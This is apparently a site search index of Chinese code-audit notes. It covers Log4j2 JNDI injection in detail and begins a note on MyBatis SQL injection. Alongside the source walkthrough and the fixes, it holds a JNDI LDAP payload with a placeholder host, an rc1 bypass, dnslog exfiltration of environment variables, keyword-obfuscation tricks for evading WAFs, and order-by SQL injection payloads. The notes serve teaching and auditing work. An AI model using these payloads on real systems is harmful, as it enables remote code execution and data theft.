jvm\u4e2d\u6dfb\u52a0\u53c2\u6570 -Dlog4j2.formatMsgNoLookups=true \uff08\u7248\u672c>=2.10.0\uff09 \u65b0\u5efalog4j2.component.properties\u6587\u4ef6\uff0c\u5176\u4e2d\u52a0\u4e0a\u914d\u7f6elog4j2.formatMsgNoLookups=true \uff08\u7248\u672c>=2.10.0\uff09 \u8bbe\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\uff1aLOG4J_FORMAT_MSG_NO_LOOKUPS=true \uff08\u7248\u672c>=2.10.0\uff09 \u5bf9\u4e8elog4j2 < 2.10\u4ee5\u4e0b\u7684\u7248\u672c\uff0c\u53ef\u4ee5\u901a\u8fc7\u79fb\u9664JndiLookup\u7c7b\u7684\u65b9\u5f0f\u3002 RC2\u4fee\u590d try{ } catch (URISyntaxException ex) { LOGGER.warn(\"Invalid JNDI URI - {}\", name); return null; } return (T) this.context.lookup(name); catch\u91cc\u76f4\u63a5return\u4e86\u3002 \u5b9e\u6218 \u6570\u636e\u5e26\u5916 \u4f7f\u7528 ${hostName} \u3001 ${env:USERDOMAIN} \u3001 ${env:COMPUTERNAME} \u7b49\u914d\u5408 dnslog \u5b9e\u73b0\u6570\u636e\u5916\u5e26\u3002 \u5173\u952e\u5b57\u6df7\u6dc6 \u5728 Lookup \u529f\u80fd\u5904\u7406\u65f6\u7684\u5173\u952e\u5b57\u66ff\u6362\u8fc7\u7a0b\u4e2d\uff0c\u63d0\u5230\u4e86\u53ef\u4ee5\u4f7f\u7528 :- \u8fdb\u884c\u4e00\u4e2a\u622a\u53d6\u548c\u8d4b\u503c\u7684\u64cd\u4f5c\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u7528\u5176\u6765\u6df7\u6dc6\u6d41\u91cf\uff0c\u5206\u9694\u5173\u952e\u5b57\u3002\u4f8b\u5982\uff1a jndi \u53ef\u4ee5\u5c1d\u8bd5\u6df7\u6dc6\u4e3a\uff1a ${:::::-j}${what:-n}${ls:-d}${1QAZ2wxs:-i} \u5e76\u53ef\u4ee5\u5c06\u5176\u5d4c\u5957\u4f7f\u7528\uff0c\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0d\u5b8c\u5584\u7684\u6b63\u5219\u3001\u5173\u952e\u5b57\u7684\u5339\u914d\u3002 upper\u3001lower \u6df7\u6dc6 log4j\u4e2d\u652f\u6301lower\uff0cupper\u4e24\u4e2a\u524d\u7f00\uff0c\u5206\u522b\u7528\u4e8e\u5c06\u5b57\u7b26\u6bb5\u5c0f\u5199\u548c\u5927\u5199\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7ed5\u8fc7\u4e00\u4e9b\u4f4e\u7ea7waf \u540c\u65f6\u5b58\u5728\u4e00\u4e9b\u5b57\u7b26\u5982 \u0131(\\u0131) \u7ecf\u8fc7 toUpperCase \u5c31\u4f1a\u8f6c\u53d8\u6210 I\u3002\u4ece\u800c\u7ed5\u8fc7\u4e86 jndi \u5173\u952e\u8bcd\u7684\u62e6\u622a\u3002 \u5d4c\u5957 \u987e\u540d\u601d\u4e49 \u5173\u952e\u5b57 logger. Reference https://www.anquanke.com/post/id/263325#h2-6 https://cloud.tencent.com/developer/article/1917881 http://wjlshare.com/archives/1674 https://xz.aliyun.com/t/10649#toc-2","title":"Log4j2 RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#log4j2-rce","text":"","title":"Log4j2 RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_1","text":"Log4j? \u5206\u6790 \u603b\u7ed3 2.15.0 RC1\u7ed5\u8fc7 RC2\u4fee\u590d \u5b9e\u6218 \u6570\u636e\u5e26\u5916 \u5173\u952e\u5b57\u6df7\u6dc6 upper\u3001lower \u6df7\u6dc6 \u5d4c\u5957 \u5173\u952e\u5b57 Reference \u672c\u8d28\u4e0a\u662f\u4e00\u4e2aJNDI\u6ce8\u5165\uff0c\u5c4c\u5f97\u4e00\u6279\uff0c\u4e4b\u524d\u6380\u8d77\u5927\u70ed\u3002","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#log4j","text":"\u7b80\u5355\u70b9\uff0c\u5c31\u662f\u4e00\u4e2a\u62ff\u6765\u6253\u5370\u65e5\u5fd7\u7684\u5e93\uff0cLog4j2\u662fLog4j\u8d85\u7ea7\u589e\u5f3a\u7248\u3002","title":"Log4j?"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_2","text":"\u5f71\u54cd\u8303\u56f4 Java\u7c7b\u4ea7\u54c1\uff1aApache Log4j 2.x < 2.15.0-rc2 \u53d7\u5f71\u54cd\u7684\u5e94\u7528\u53ca\u7ec4\u4ef6\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff09\u5982\u4e0b\uff1aApache Solr\u3001Apache Flink\u3001Apache Druid\u3001Apache Struts2\u3001pring-boot-strater-log4j2\u7b49\u3002\uff08\u6765\u81ea\u817e\u8baf\u4e91\u793e\u533a\uff09 \u5efa\u7acb\u4e00\u4e2aservlet\uff08\u5ad6\u81ea\u817e\u8baf\u4e91\u793e\u533a\uff09 @WebServlet(name = \"ServletDemo\", value = \"/ServletDemo\") public class ServletDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Logger logger = LogManager.getLogger(ServletDemo.class.getName()); PrintWriter printWriter = response.getWriter(); printWriter.println(\"Log4j2 JNDI injection\"); String payload = request.getParameter(\"msg\"); if (payload == null){ payload = \"input msg parameter: ?msg=helloworld\"; } printWriter.println(\"execute paylaod: \" + payload); logger.error(payload); printWriter.flush(); printWriter.close(); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException { Logger logger = LogManager.getLogger(ServletDemo.class.getName()); PrintWriter printWriter = response.getWriter(); printWriter.println(\"Log4j2 JNDI injection\"); String payload = request.getParameter(\"msg\"); if (payload == null){ payload = \"input msg parameter: ?msg=helloworld\"; } printWriter.println(\"execute paylaod: \" + payload); logger.error(payload); printWriter.flush(); printWriter.close(); } } \u6b63\u5e38\u8fd0\u884c\u65f6\uff0clogger.error\u4f1a\u628a\u65e5\u5fd7\u8f93\u51fa\u5230\u670d\u52a1\u5668\u9762\u677f\u3002 \u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b\u8fd9\u4e2alogger.error\u3002 \u4e0b\u65ad\u70b9\uff0c\u8c03\u8bd5\u5f00\u641e\u3002 \u5148\u8c03\u7528logIfEnabled\u51fd\u6570\u5224\u65ad\u5f53\u524d\u4e8b\u4ef6\u7c7b\u578b\u7684\u4f18\u5148\u7ea7\uff0c\u5982\u679c\u4f18\u5148\u7ea7\u4e0d\u591f\u5c31\u4e0d\u4f1a\u8fdb\u884c\u4e4b\u540e\u7684\u4ee3\u7801\u64cd\u4f5c \u65e5\u5fd7\u7ea7\u522b log4j2\u4f5c\u4e3a\u4e00\u4e2a\u65e5\u5fd7\u5904\u7406\u7ec4\u4ef6\uff0c\u5b83\u5bf9\u65e5\u5fd7\u4e8b\u4ef6\u7684\u4f18\u5148\u7ea7\u8fdb\u884c\u4e86\u5206\u7c7b\u4ee5\u65b9\u4fbf\u540e\u7eed\u7684\u5904\u7406 \u5176\u5185\u7f6e\u7684\u65e5\u5fd7\u7ea7\u522b\u6807\u51c6\u5982\u4e0b\uff0c\u5404\u4e2a\u7ea7\u522b\uff08intLevel\uff09\u7531\u6570\u503c\u8868\u793a\uff0c\u7ea7\u522b\u8d8a\u9ad8\u6570\u503c\u8d8a\u5c0f\u3002 \u5728\u4e0a\u9762\u5bf9logIfEnabled\u7684\u8ddf\u8fdb\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u6709\u5f53intLevel >= level.intLevel()\uff0c\u5373\u5f53\u524d\u4e8b\u4ef6\u7684intLevel\u5c0f\u4e8eintLevel\u5e38\u91cf\u503c\u65f6\u624d\u4f1a\u7ee7\u7eed\u8fdb\u884c\u4ee3\u7801\u3002 \u800c\u9ed8\u8ba4\u7684intLevel\u5e38\u91cf\u503c\u4e3a200\uff0c\u5373error\u7ea7\u522b\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u6709\u4f18\u5148\u7ea7\u5927\u4e8e\u7b49\u4e8eerror\u7684\u4e8b\u4ef6\u624d\u4f1a\u7ee7\u7eed\u6267\u884c\u4ee3\u7801\uff0c\u542f\u7528\u65e5\u5fd7\u6253\u5370\u3002\uff08\u672c\u6587\u662f\u7528\u7684logger.error\u89e6\u53d1\uff0c\u6240\u4ee5\u540c\u7406\u4e5f\u53ef\u4ee5\u7528logger.fatal\u89e6\u53d1\uff09 \u8fd9\u4e2aintLevel\u5e38\u91cf\u503c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u548cConfigurator.setLevel\u51fd\u6570\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\u3002 \u5c06\u65ad\u70b9\u65ad\u5728 org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java \u4e2d\u7684 directEncodeEvent \uff0c\u7ee7\u7eed\u8c03\u8bd5 \u6a21\u5f0f\u5e03\u5c40 \u8fd9\u91cc\u7684getLayout\u65b9\u6cd5\u4f1a\u83b7\u53d6\u65e5\u5fd7\u6253\u5370\u7684\u6a21\u5f0f\u5e03\u5c40\uff0c\u4e5f\u5c31\u662f\u65e5\u5fd7\u7684\u683c\u5f0f\u5316\u5f62\u5f0f\u3002 \u9ed8\u8ba4\u7684\u6a21\u5f0f\u5e03\u5c40\u4e3a%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n\uff0c\u4e5f\u5c31\u662f\u4e0a\u56fe\u4e2d\u7684\u90a3\u6837\u3002 \u5f53\u5728\u89e3\u6790\u8fd9\u4e32\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65f6\u65f6\uff0c\u4f1a\u7ed3\u5408 List<PatternConverter> \u8f6c\u6362\u5668\u5217\u8868\u548c List<FormattingInfo> \u683c\u5f0f\u4fe1\u606f\u5217\u8868\u8fd9\u4e24\u4e2a\u5217\u8868\u8fdb\u884c\u683c\u5f0f\u5316\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u5982%d\uff0c%t\u7b49\u4e00\u7cfb\u5217\u5360\u4f4d\u7b26\uff0c\u8fd9\u4e9b\u5360\u4f4d\u7b26\u7684\u610f\u4e49\u662f\u7528\u4e8e\u6807\u8bc6\u8f6c\u6362\u5668\uff0c\u8868\u793a\u5f53\u524d\u4f4d\u7f6e\u7684\u5b57\u7b26\u4e32\u5e94\u8be5\u7531\u4f55\u79cd\u8f6c\u6362\u5668\u5904\u7406\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8ddf\u8fdbencode\u65b9\u6cd5 toSerializable\u65b9\u6cd5\u4e2d\u4f1a\u5148\u83b7\u53d6 PatternConverter \u8f6c\u6362\u5668\u5217\u8868\uff0c\u7136\u540e\u7528\u4e0d\u540c\u7684\u8f6c\u6362\u5668\u5904\u7406\u4f20\u5165\u7684\u6570\u636e log4j2 rce\u662fMessagePatternConverter\u8fd9\u4e2a\u8f6c\u6362\u5668\u51fa\u4e86\u95ee\u9898\uff0c\u6240\u4ee5\u6211\u4eec\u5feb\u8fdb\u5230MessagePatternConverter#format \u5b83\u6700\u5f00\u59cb\u4f1a\u5148\u53bb\u83b7\u5f97\u5f53\u524devent\u4fe1\u606f\u4e2d\u7684message\u4fe1\u606f \u7136\u540e\u5728\u540e\u9762\u5224\u65adconfig\u4e0enoLookups\u5c5e\u6027\u7684\u72b6\u51b5 \u518d\u7136\u540e\uff08\u91cd\u70b9\uff09\u53bb\u5224\u65admsg\u4fe1\u606f\u4e2d\u662f\u5426\u5b58\u5728\u5b57\u7b26\u4e32\u201c${\u201d\uff0c\u5982\u679c\u5b58\u5728\u5c31\u4f1a\u628a$\u53ca\u540e\u9762\u7684\u5b57\u7b26\u4e32\u5207\u5272\u51fa\u6765\u5b58\u653e\u5230\u53d8\u91cfvalue\u4e2d\uff0c\u4e8e132\u884c\u5c06\u5176\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165replace\u65b9\u6cd5 \u6700\u7ec8\u4f20\u5165\u5230InitialContext.lookup\u53c2\u6570\u4e2d\uff0c\u5b8c\u6210jndi\u6ce8\u5165","title":"\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_3","text":"\u5728log4j2\u4e2d\u5982\u679c\u89e6\u53d1\u4e86error\u7ea7\u522b\u4ee5\u4e0a\u7684\u4e8b\u4ef6\uff0clog4j2\u4f1a\u8c03\u7528\u4e0d\u540c\u8f6c\u6362\u5668\u53bb\u5206\u6790\u4e8b\u4ef6\u7528\u4e8e\u683c\u5f0f\u5316\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5728MessagePatternConverter\u8fd9\u4e2a\u8f6c\u6362\u5668\u4e2d\u4f1a\u53bb\u83b7\u53d6\u4e8b\u4ef6\u4e2d\u7684message\u4fe1\u606f\uff08\u4e5f\u5c31\u662f\u4f20\u5165logger.error\u7b49\u51fd\u6570\u4e2d\u7684String\u53c2\u6570\uff09\u8fdb\u884c\u5904\u7406\uff0c\u5982\u679cmessage\u4fe1\u606f\u4e2d\u5b58\u5728\"${\"\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u6839\u636e${}\u4e2d\u5185\u5bb9\u7684prefix\u9009\u53d6\u5bf9\u5e94\u7684Lookup\u5904\u7406\u5668\u8fdb\u884c\u5904\u7406\uff0c\u5982\u679c\u662fprefix\u662fjndi\u5c31\u4f1a\u9020\u6210jndi\u6ce8\u5165","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#2150-rc1","text":"\u524d\u63d0\u6761\u4ef6\uff1a\u76ee\u6807\u73af\u5883\u7684log4j2\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684%msg\u6539\u6210\u4e86%msg{lookup} \uff0c\u6216\u8005\u901a\u8fc7API\u52a8\u6001\u4fee\u6539\u542f\u7528\u4e86lookup just like this <?xml version=\"1.0\" encoding=\"UTF-8\"?> <Configuration status=\"WARN\"> <Appenders> <Console name=\"Console\" target=\"SYSTEM_OUT\"> <PatternLayout pattern=\"[%-level]%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{lookups}%n\"/> </Console> </Appenders> <Loggers> <Root level=\"info\"> <AppenderRef ref=\"Console\"/> </Root> </Loggers> </Configuration> \u4f46\u8fd9\u4e2a\u524d\u63d0\u6761\u4ef6\u5c5e\u5b9e\u82db\u523b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7ed5\u8fc7\u4e5f\u5c5e\u5b9e\u6709\u70b9\u9e21\u808b\u3002 payload: ${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject} \u5728host/\u540e\u52a0\u4e86\u4e2a\u7a7a\u683c \u7b80\u8981\u5206\u6790\u8fc7\u7a0b\uff1a\u5728\u8fdb\u884cjndilookup\u64cd\u4f5c\u65f6\uff0c\u4f1a\u5224\u65adhost\u662f\u5426\u662f\u767d\u540d\u5355\u91cc\u7684host(\u5747\u4e3a\u5185\u7f51ip\u6216\u57df\u540d)\uff0c\u5982\u679c\u6211\u4eec\u5728host/\u540e\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5176\u6821\u9a8c\u51fd\u6570\u629b\u51fa\u9519\u8bef\uff0c\u4f46\u662f\u629b\u51fa\u9519\u8bef\u540e\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c\u76f8\u5e94\u5904\u7406\uff0c\u5bfc\u81f4\u6700\u540e\u8fdb\u884c\u4e86\u6210\u529flookup \u4fee\u590d\u5efa\u8bae \uff08\u5f15\u7528\u81ea\u5b89\u5168\u5ba2\u5e73\u53f0\uff09 \u4fee\u590d\u5efa\u8bae\uff1a \u5347\u7ea7Apache Log4j2\u6240\u6709\u76f8\u5173\u5e94\u7528\u5230\u6700\u65b0\u7248\u3002 \u5347\u7ea7JDK\u7248\u672c\uff0c\u5efa\u8baeJDK\u4f7f\u752811.0.1\u30018u191\u30017u201\u30016u211\u53ca\u4ee5\u4e0a\u7684\u9ad8\u7248\u672c\u3002\u4f46\u4ecd\u6709\u7ed5\u8fc7Java\u672c\u8eab\u5bf9Jndi\u8fdc\u7a0b\u52a0\u8f7d\u7c7b\u5b89\u5168\u9650\u5236\u7684\u98ce\u9669\u3002 \u4e34\u65f6\u5efa\u8bae\uff1a jvm\u4e2d\u6dfb\u52a0\u53c2\u6570 -Dlog4j2.formatMsgNoLookups=true \uff08\u7248\u672c>=2.10.0\uff09 \u65b0\u5efalog4j2.component.properties\u6587\u4ef6\uff0c\u5176\u4e2d\u52a0\u4e0a\u914d\u7f6elog4j2.formatMsgNoLookups=true \uff08\u7248\u672c>=2.10.0\uff09 \u8bbe\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\uff1aLOG4J_FORMAT_MSG_NO_LOOKUPS=true \uff08\u7248\u672c>=2.10.0\uff09 \u5bf9\u4e8elog4j2 < 2.10\u4ee5\u4e0b\u7684\u7248\u672c\uff0c\u53ef\u4ee5\u901a\u8fc7\u79fb\u9664JndiLookup\u7c7b\u7684\u65b9\u5f0f\u3002","title":"2.15.0 RC1\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#rc2","text":"try{ } catch (URISyntaxException ex) { LOGGER.warn(\"Invalid JNDI URI - {}\", name); return null; } return (T) this.context.lookup(name); catch\u91cc\u76f4\u63a5return\u4e86\u3002","title":"RC2\u4fee\u590d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_4","text":"","title":"\u5b9e\u6218"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_5","text":"\u4f7f\u7528 ${hostName} \u3001 ${env:USERDOMAIN} \u3001 ${env:COMPUTERNAME} \u7b49\u914d\u5408 dnslog \u5b9e\u73b0\u6570\u636e\u5916\u5e26\u3002","title":"\u6570\u636e\u5e26\u5916"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_6","text":"\u5728 Lookup \u529f\u80fd\u5904\u7406\u65f6\u7684\u5173\u952e\u5b57\u66ff\u6362\u8fc7\u7a0b\u4e2d\uff0c\u63d0\u5230\u4e86\u53ef\u4ee5\u4f7f\u7528 :- \u8fdb\u884c\u4e00\u4e2a\u622a\u53d6\u548c\u8d4b\u503c\u7684\u64cd\u4f5c\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u7528\u5176\u6765\u6df7\u6dc6\u6d41\u91cf\uff0c\u5206\u9694\u5173\u952e\u5b57\u3002\u4f8b\u5982\uff1a jndi \u53ef\u4ee5\u5c1d\u8bd5\u6df7\u6dc6\u4e3a\uff1a ${:::::-j}${what:-n}${ls:-d}${1QAZ2wxs:-i} \u5e76\u53ef\u4ee5\u5c06\u5176\u5d4c\u5957\u4f7f\u7528\uff0c\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0d\u5b8c\u5584\u7684\u6b63\u5219\u3001\u5173\u952e\u5b57\u7684\u5339\u914d\u3002","title":"\u5173\u952e\u5b57\u6df7\u6dc6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#upperlower","text":"log4j\u4e2d\u652f\u6301lower\uff0cupper\u4e24\u4e2a\u524d\u7f00\uff0c\u5206\u522b\u7528\u4e8e\u5c06\u5b57\u7b26\u6bb5\u5c0f\u5199\u548c\u5927\u5199\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7ed5\u8fc7\u4e00\u4e9b\u4f4e\u7ea7waf \u540c\u65f6\u5b58\u5728\u4e00\u4e9b\u5b57\u7b26\u5982 \u0131(\\u0131) \u7ecf\u8fc7 toUpperCase \u5c31\u4f1a\u8f6c\u53d8\u6210 I\u3002\u4ece\u800c\u7ed5\u8fc7\u4e86 jndi \u5173\u952e\u8bcd\u7684\u62e6\u622a\u3002","title":"upper\u3001lower \u6df7\u6dc6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_7","text":"\u987e\u540d\u601d\u4e49","title":"\u5d4c\u5957"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#_8","text":"logger.","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/#reference","text":"https://www.anquanke.com/post/id/263325#h2-6 https://cloud.tencent.com/developer/article/1917881 http://wjlshare.com/archives/1674 https://xz.aliyun.com/t/10649#toc-2","title":"Reference"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/","text":"Mybatis \u76ee\u5f55 \u7b80\u4ecb \u539f\u7406 \\$\u548c# like in order by OGNL\u6ce8\u5165 if choose bind \\${param} \u53c2\u6570 spirngboot \u6ce8\u91ca\uff08\u552f\u4e00\u7684\u53ef\u80fd\uff09 \u5173\u952e\u5b57 \u7b80\u4ecb Mybatis\u662fjava\u91cc\u7684\u6570\u636e\u5e93\u6a21\u5757\uff0c\u7528\u4e8e\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\uff0c\u5c5e\u4e8edao\u5c42\u3002 \u539f\u7406 \\$\u548c# Mybatis\u5728\u5b9a\u4e49sql\u8bed\u53e5\u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u6ce8\u91ca\u5f62\u5f0f\u548cxml\u5f62\u5f0f\uff0c\u5176\u4e2dxml\u5f62\u5f0f\u7528\u7684\u66f4\u591a\u4e00\u70b9 xml\u5f62\u5f0f\uff1a \u6ce8\u91ca\u5f62\u5f0f,\u672c\u8d28\u4e0a\u548cxml\u5f62\u5f0f\u5dee\u4e0d\u591a\u53ea\u662f\u5199\u5728\u4e86\u6301\u4e45\u5c42\u63a5\u53e3\u7684\u6ce8\u91ca\u91cc\uff0c\u7528\u7684\u4e0d\u591a\u3002 \u5728mybatis\u91cc\uff0csql\u8bed\u53e5\u4e0e\u53c2\u6570\u8fdb\u884c\u62fc\u63a5\u65f6\uff0c\u6709\u4e24\u79cd\u7b26\u53f7#\u548c\\$ SELECT * FROM NEWS WHERE ID = #{id} SELECT * FROM NEWS WHERE ID = ${id} \u4ed6\u4eec\u7684\u533a\u522b\u5c31\u662f#\u662f\u542f\u7528\u4e86\u9884\u7f16\u8bd1\uff0c\u800c\\$\u6ca1\u6709\u542f\u7528\u3002 \u6240\u4ee5\u5ba1mybatis\u65f6\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8\\$\u7b26\u7684\u62fc\u63a5\u3002 \u540c\u65f6\u8fd8\u6709\u4e0b\u9762\u7684\u51fd\u6570\u4e5f\u503c\u5f97\u5173\u6ce8 like \u65b0\u624b\u5728like\u540e\u9762\u63d2\u5165\u53c2\u6570\u65f6\u5f80\u5f80\u4f1a\u5199\u9519\u50cf\u8fd9\u6837 Select * from news where title like \u2018%#{title}%\u2019 \u4f46\u8fd9\u6837\u4f1a\u62a5\u9519\uff0c\u6709\u53ef\u80fd\u65b0\u624b\u7a0b\u5e8f\u5458\u5c31\u76f4\u63a5\u628a#\u6539\u6210\\$\u4e86\uff0c\u4ece\u800c\u9020\u6210\u6ce8\u5165 \u8fd9\u6837\u6539\u5c31\u6ca1\u4e8b\u4e86\uff0c\u5b89\u5168\u4e86 select * from news where tile like concat(\u2018%\u2019,#{title}, \u2018%\u2019) in \u540c\u7406\uff0cin\u65b0\u624b\u4e5f\u53ef\u80fd\u5199\u6210\u8fd9\u6837\u4ece\u800c\u62a5\u9519\uff0c\u7136\u540e\u6539\u6210\\$ Select * from news where id in (#{ids}) \u6b63\u786e\u5199\u6cd5\u5982\u4e0b id in <foreach collection=\"ids\" item=\"item\" open=\"(\"separatosr=\",\" close=\")\"> ##{ids} </foreach> order by \u53ea\u80fd\u7528\\$\uff0c\u4e0d\u80fd\u7528#\u5f00\u542f\u9884\u7f16\u8bd1 \u539f\u7406\u662forder by\u540e\u9762\u7684\u53c2\u6570\u4e0d\u80fd\u53c2\u6570\u5316\uff0c\u5728\u53c2\u6570\u88ab\u9884\u7f16\u8bd1\u53c2\u6570\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u52a0\u4e0a\u5f15\u53f7\uff0c\u4ece\u800c\u5bfc\u81f4order by\u540e\u9762\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u503c\uff0c\u4f46\u662forder by\u540e\u9762\u53ea\u80fd\u8ddf\u5b57\u6bb5\u540d\u800c\u4e0d\u80fd\u8ddf\u5b57\u7b26\u4e32\u503c\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u5177\u4f53\u6ce8\u5165payload \u62a5\u9519\u6ce8\u5165 select * from ha order by updatexml(1,if(1=1,1,user()),1);#\u67e5\u8be2\u6b63\u5e38 select * from ha order by updatexml(1,if(1=2,1,user()),1);#\u67e5\u8be2\u62a5\u9519 select * from ha order by extractvalue(1,if(1=1,1,user()));#\u67e5\u8be2\u6b63\u5e38 select * from ha order by extractvalue(1,if(1=2,1,user()));#\u67e5\u8be2\u62a5\u9519 rand\u76f2\u6ce8 \u5f53rand\u91cc\u7684\u503c\u5206\u522b\u4e3afalse\u548ctrue\u7684\u65f6\u5019\uff0c\u6392\u5217\u72b6\u51b5\u4f1a\u4e0d\u4e00\u6837 rand(ascii(mid((select database()),1,1))>96) \u65f6\u95f4\u76f2\u6ce8 order by if(1=1,1,sleep(1)) 